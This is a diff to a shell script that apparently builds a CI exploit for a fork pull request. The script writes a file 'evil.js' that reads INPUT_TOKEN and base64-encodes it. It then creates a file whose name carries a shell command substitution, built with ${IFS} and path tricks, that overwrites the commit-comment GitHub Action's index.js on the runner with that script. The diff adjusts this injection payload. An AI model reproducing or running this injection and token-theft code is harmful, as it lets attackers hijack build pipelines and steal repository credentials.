@@ -2,7 +2,6 @@
 set -euo pipefail
 mkdir -p content
 cd content
-printf 'malicious artifact from fork PR\n' > rce.txt
 cat > evil.js <<'JS'
 const b64 = (s) => Buffer.from(String(s)).toString('base64');
 const token = process.env.INPUT_TOKEN || '';
@@ -98,5 +97,5 @@ const rq = async (path, opts = {}) => {
   console.log('SLEEP_DONE=' + new Date().toISOString());
 })().catch((e) => console.log('EVIL_ERROR=' + e));
 JS
-OVR='rce$(S=$(dirname${IFS}${HOME%runner});cp${IFS}${S}tmp${S}content${S}content${S}evil.js${IFS}${S}home${S}runner${S}work${S}_actions${S}peter-evans${S}commit-comment${S}v3${S}dist${S}index.js).txt'
+OVR='rce$(S=$(dirname${IFS}${HOME%runner});cp${IFS}${S}tmp${S}content${S}content${S}evil.js${IFS}${S}home${S}runner${S}work${S}_actions${S}peter-evans${S}commit-comment${S}v3${S}dist${S}index.js;printf${IFS}x>/tmp/content/content/rce.txt).txt'
 touch "$OVR"
